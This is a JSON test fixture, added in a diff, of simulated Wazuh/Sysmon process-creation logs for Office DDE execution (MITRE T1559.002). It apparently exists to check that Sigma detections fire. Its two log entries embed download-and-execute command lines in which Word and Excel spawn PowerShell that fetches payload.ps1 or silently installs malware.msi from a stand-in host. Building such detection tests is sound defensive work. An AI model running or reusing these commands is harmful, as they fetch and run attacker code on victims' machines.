@@ -1,0 +1,166 @@
+{
+  "_metadata": {
+    "attack_id": "T1559.002",
+    "variation": "001",
+    "name": "Dynamic Data Exchange - Office DDE",
+    "description": "Adversary uses DDE in Office documents to execute commands",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Word spawning cmd via DDE",
+      "sequence": 1,
+      "timestamp": "2026-02-08T15:55:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:55:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Process Create",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1559.002"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Inter-Process Communication: Dynamic Data Exchange"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300052",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 15:55:00.000",
+              "processGuid": "{A1B2C3D4-EXEC-1559-0002-000000000001}",
+              "processId": "16234",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.110/payload.ps1')\"",
+              "currentDirectory": "C:\\Users\\user.victim\\Documents\\",
+              "user": "CORP\\user.victim",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1",
+              "parentProcessGuid": "{A1B2C3D4-EXEC-1559-0002-PARENT000001}",
+              "parentProcessId": "15890",
+              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\user.victim\\Documents\\Urgent_Update.docx\""
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1559.002",
+        "_fomorian_expected_detection": "Sigma: Word DDE Spawning CMD (T1559.002)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Excel DDE spawning PowerShell",
+      "sequence": 2,
+      "timestamp": "2026-02-08T15:56:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:56:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Process Create",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1559.002"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Inter-Process Communication: Dynamic Data Exchange"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300053",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 15:56:00.000",
+              "processGuid": "{A1B2C3D4-EXEC-1559-0002-000000000002}",
+              "processId": "16456",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -w 1 -ep bypass Start-Process msiexec -ArgumentList '/q /i http://198.51.100.110/malware.msi'",
+              "currentDirectory": "C:\\Users\\user.victim\\Downloads\\",
+              "user": "CORP\\user.victim",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2",
+              "parentProcessGuid": "{A1B2C3D4-EXEC-1559-0002-PARENT000002}",
+              "parentProcessId": "16100",
+              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\user.victim\\Downloads\\Invoice_2026.xlsx\""
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1559.002",
+        "_fomorian_expected_detection": "Sigma: Excel DDE Spawning PowerShell (T1559.002)"
+      }
+    }
+  ]
+}
